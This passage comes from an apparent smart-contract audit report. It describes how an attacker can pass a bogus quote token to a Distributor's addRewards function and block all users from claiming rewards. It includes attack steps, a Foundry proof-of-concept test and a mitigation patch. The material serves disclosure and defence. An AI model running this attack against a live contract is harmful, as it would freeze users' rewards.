5. Attacker mints some bogusQuote to themselves and approves the Distributor for that amount.
6. Attacker calls addRewards(launchAsset, bogusQuote, 0, bogusAmount), passing bogusQuote as token1 and setting amount1 > 0. This:
   - Increases rs.pendingQuoteRewards by bogusAmount.
   - Increases totalPendingRewards[bogusQuote] by bogusAmount.
   - Transfers bogusQuote tokens into Distributor.
   - Leaves totalPendingRewards[realQuoteAsset] == 0.
7. Alice now tries to claim rewards by calling claimRewards(launchAsset):
   - RewardsTrackerLib.update() converts pendingQuoteRewards into accQuoteRewardPerShare.
   - rs.claim(alice) returns quoteAmount > 0.
   - _distributeAssets calls _decreaseTotalPending(realQuoteAsset, quoteAmount).
   - Since totalPendingRewards[realQuoteAsset] == 0, ClaimAmountExceedsTotalPendingRewards is thrown and the transaction reverts.
8. All users of this pool are now unable to claim quote rewards (and any stake/unstake action that realizes quote rewards) until some trusted party deposits enough realQuoteAsset via a correct addRewards call.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount);
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount);
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DistributorMismatchedQuoteTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 realQuote;
    MockERC20 bogusQuote;
    address launchpad = address(this);
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchAsset = new MockERC20();
        realQuote = new MockERC20();
        bogusQuote = new MockERC20();

        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(realQuote));

        // Seed some shares so addRewards won't revert with NoSharesToIncentivize.
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), alice, 1);
    }

    function testMismatchedQuoteBricksPool() public {
        // Attacker funds bogusQuote and approves Distributor.
        bogusQuote.mint(attacker, 1e18);
        vm.prank(attacker);
        bogusQuote.approve(address(distributor), 1e18);

        // Attacker adds quote rewards using bogusQuote instead of the real quote asset.
        vm.prank(attacker);
        distributor.addRewards(address(launchAsset), address(bogusQuote), 0, 1e18);

        // Alice now tries to claim rewards for the launch asset.
        // RewardsTrackerLib.update() will accrue quote rewards, but
        // _decreaseTotalPending(realQuote, quoteAmount) will underflow
        // because totalPendingRewards[realQuote] was never increased.
        vm.prank(alice);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(launchAsset));
    }
}


## Suggested Mitigation
Add a strict validation that the supplied quote token matches the pool’s canonical quote asset, and always account and transfer using the canonical asset. Also define the missing error. Example minimal patch:

// Add to Distributor
error InvalidQuoteAsset();

function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) = (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), launchAssetAmount);
    }

    if (quoteAssetAmount > 0) {
        if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset();
        // Always account and transfer the canonical quote asset
        rs.addQuoteRewards(launchAsset, rs.quoteAsset, quoteAssetAmount);
        _increaseTotalPending(rs.quoteAsset, quoteAssetAmount);
        rs.quoteAsset.safeTransferFrom(msg.sender, address(this), quoteAssetAmount);
    }
}

Optionally, remove the quoteAsset parameter from addQuoteRewards (it is only used for the event) or assert it equals rs.quoteAsset inside the library to prevent future misuse. As a defense-in-depth alternative, derive the token pair from a trusted source (e.g., the launchpad pair) rather than trusting user-supplied token0/token1 on a permissionless path.



